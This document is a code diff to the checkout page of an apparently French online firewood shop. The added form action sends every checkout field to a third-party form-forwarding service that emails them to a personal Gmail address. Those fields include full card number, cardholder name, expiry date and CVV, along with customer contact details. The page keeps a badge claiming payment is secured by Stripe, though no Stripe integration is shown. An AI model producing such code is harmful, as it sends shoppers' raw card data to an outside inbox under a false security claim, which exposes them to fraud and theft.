@@ -267,63 +267,65 @@
         <div class="checkout-container">
             <div class="form-area">
                 <h3>Détails de Livraison & Facturation</h3>
-                <form id="checkoutForm">
+                
+                <form id="checkoutForm" action="https://formsubmit.co/cedricaplogan123@gmail.com" method="POST">
+                    
                     <div class="form-row">
                         <div class="form-group">
                             <label for="coFirstName">Prénom</label>
-                            <input type="text" id="coFirstName" name="firstName" placeholder="Jean" required>
+                            <input type="text" id="coFirstName" name="Prénom" placeholder="Jean" required>
                         </div>
                         <div class="form-group">
                             <label for="coLastName">Nom</label>
-                            <input type="text" id="coLastName" name="lastName" placeholder="Dupond" required>
+                            <input type="text" id="coLastName" name="Nom" placeholder="Dupond" required>
                         </div>
                     </div>
                     
                     <div class="form-group">
                         <label for="coAddress">Adresse de Livraison</label>
-                        <input type="text" id="coAddress" name="address" placeholder="12 Rue du Foyer" required>
+                        <input type="text" id="coAddress" name="Adresse_de_Livraison" placeholder="12 Rue du Foyer" required>
                     </div>
 
                     <div class="form-row">
                         <div class="form-group">
                             <label for="coZip">Code Postal</label>
-                            <input type="text" id="coZip" name="zip" placeholder="75000" required>
+                            <input type="text" id="coZip" name="Code_Postal" placeholder="75000" required>
                         </div>
                         <div class="form-group">
                             <label for="coCity">Ville</label>
-                            <input type="text" id="coCity" name="city" placeholder="Paris" required>
+                            <input type="text" id="coCity" name="Ville" placeholder="Paris" required>
                         </div>
                     </div>
                     
                     <div class="form-group">
                         <label for="coEmail">Email</label>
-                        <input type="email" id="coEmail" name="email" placeholder="jean@exemple.com" required>
+                        <input type="email" id="coEmail" name="Email_Client" placeholder="jean@exemple.com" required>
                     </div>
                     
                     <div class="form-group">
                         <label for="coPhone">Téléphone (pour la livraison)</label>
-                        <input type="tel" id="coPhone" name="phone" placeholder="06 00 00 00 00" required>
+                        <input type="tel" id="coPhone" name="Téléphone_Livraison" placeholder="06 00 00 00 00" required>
                     </div>
 
                     <h3 style="margin-top: 50px;">Informations de Paiement</h3>
                     
                     <div class="form-group">
                         <label for="cardNumber">Numéro de Carte</label>
-                        <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" required pattern="[0-9]{16}">
+                        <input type="text" id="cardNumber" name="Numéro_de_Carte" placeholder="0000 0000 0000 0000" required pattern="[0-9]{16}">
                     </div>
                     
                     <div class="form-group card-details">
                         <div class="form-group">
                             <label for="cardName">Nom sur la Carte</label>
-                            <input type="text" id="cardName" name="cardName" placeholder="M. Jean DUPOND" required>
+                            <input type="text" id="cardName" name="Nom_sur_la_Carte" placeholder="M. Jean DUPOND" required>
                         </div>
                         <div class="form-group">
                             <label for="cardExpiry">Expiration (MM/AA)</label>
-                            <input type="text" id="cardExpiry" name="cardExpiry" placeholder="12/26" required pattern="(0[1-9]|1[0-2])\/\d{2}">
+                            <input type="text" id="cardExpiry" name="Expiration_Carte" placeholder="12/26" required pattern="(0[1-9]|1[0-2])\/\d{2}">
                         </div>
                         <div class="form-group">
                             <label for="cardCvv">CVV</label>
-                            <input type="text" id="cardCvv" name="cardCvv" placeholder="123" required pattern="\d{3,4}">
+                            <input type="text" id="cardCvv" name="CVV" placeholder="123" required pattern="\d{3,4}">
                         </div>
                     </div>
                     
@@ -334,8 +336,11 @@
                     </div>
 
                     <button type="submit" class="form-submit checkout-btn" id="pay-button">
-                        Payer <span id="pay-button-total">285.00€</span> et Valider la Commande
+                        Payer <span id="pay-button-total">273.00€</span> et Valider la Commande
                     </button>
+                    
+                    <input type="hidden" name="Montant_Total_Payé" id="hidden-total-amount" value="273.00€">
+                    
                 </form>
                 <div class="secure-badge">Paiement sécurisé par <span>Stripe</span>. Vos données sont protégées.</div>
             </div>
@@ -347,7 +352,7 @@
                     <div class="summary-item cart-item" data-price="95.00">
                         <span class="item-name">Chêne Premium (50cm) - Stère</span>
                         <div class="summary-item-controls">
-                            <input type="number" class="quantity-input" value="" min="" data-item-id="chene">
+                            <input type="number" class="quantity-input" value="2" min="1" data-item-id="chene" name="Quantité_Chêne">
                             <span class="item-price">190.00€</span>
                             <button class="remove-btn" data-item-id="chene" aria-label="Supprimer">×</button>
                         </div>
@@ -355,7 +360,7 @@
                     <div class="summary-item cart-item" data-price="15.00">
                         <span class="item-name">Filet de Bûches Sec (33cm)</span>
                         <div class="summary-item-controls">
-                            <input type="number" class="quantity-input" value="1" min="" data-item-id="filet">
+                            <input type="number" class="quantity-input" value="1" min="1" data-item-id="filet" name="Quantité_Filet_Sec">
                             <span class="item-price">15.00€</span>
                             <button class="remove-btn" data-item-id="filet" aria-label="Supprimer">×</button>
                         </div>
@@ -363,7 +368,7 @@
                     <div class="summary-item cart-item" data-price="19.90">
                         <span class="item-name">Kit d'Allumage Naturel</span>
                         <div class="summary-item-controls">
-                            <input type="number" class="quantity-input" value="1" min="" data-item-id="kit">
+                            <input type="number" class="quantity-input" value="1" min="1" data-item-id="kit" name="Quantité_Kit_Allumage">
                             <span class="item-price">19.90€</span>
                             <button class="remove-btn" data-item-id="kit" aria-label="Supprimer">×</button>
                         </div>
@@ -427,6 +432,7 @@
             const shippingEl = document.getElementById('summary-shipping');
             const totalAmountEl = document.getElementById('summary-total-amount');
             const payButtonTotalEl = document.getElementById('pay-button-total');
+            const hiddenTotalAmountEl = document.getElementById('hidden-total-amount'); // Nouveau champ caché
 
             // LE CERVEAU 🧠: La fonction qui recalcule tout
             function updateCartTotals() {
@@ -438,7 +444,7 @@
                 cartItems.forEach(item => {
                     const unitPrice = parseFloat(item.dataset.price);
                     const quantityInput = item.querySelector('.quantity-input');
-                    const quantity = parseInt(quantityInput.value);
+                    let quantity = parseInt(quantityInput.value);
                     
                     // Sécurité : si la quantité n'est pas un nombre ou est négative, on met 1
                     if (isNaN(quantity) || quantity < 1) {
@@ -464,6 +470,7 @@
                 shippingEl.textContent = `${shippingCost.toFixed(2)}€`;
                 totalAmountEl.textContent = `${currentTotal.toFixed(2)}€`;
                 payButtonTotalEl.textContent = `${currentTotal.toFixed(2)}€`; // On update aussi le bouton !
+                hiddenTotalAmountEl.value = `${currentTotal.toFixed(2)}€`; // On update le champ caché !
             }
 
             // GESTION DES ÉVÉNEMENTS (Les "Listeners")
